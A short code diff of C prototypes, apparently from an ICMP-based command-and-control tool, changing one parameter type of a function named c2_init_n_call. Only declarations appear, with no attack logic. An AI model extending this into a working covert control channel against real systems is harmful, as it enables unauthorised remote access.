@@ -4,7 +4,7 @@
 #include <netinet/ip_icmp.h>
 #define BUFFER_SIZE 1024
 
-void c2_init_n_call(unsigned char *interface_to_bind);
+void c2_init_n_call(char *interface_to_bind);
 int create_socket(unsigned char *inteface_to_bind);
 int read_from_socket(int sockfd, unsigned char *buffer,int size);
 void interact(int sockfd);
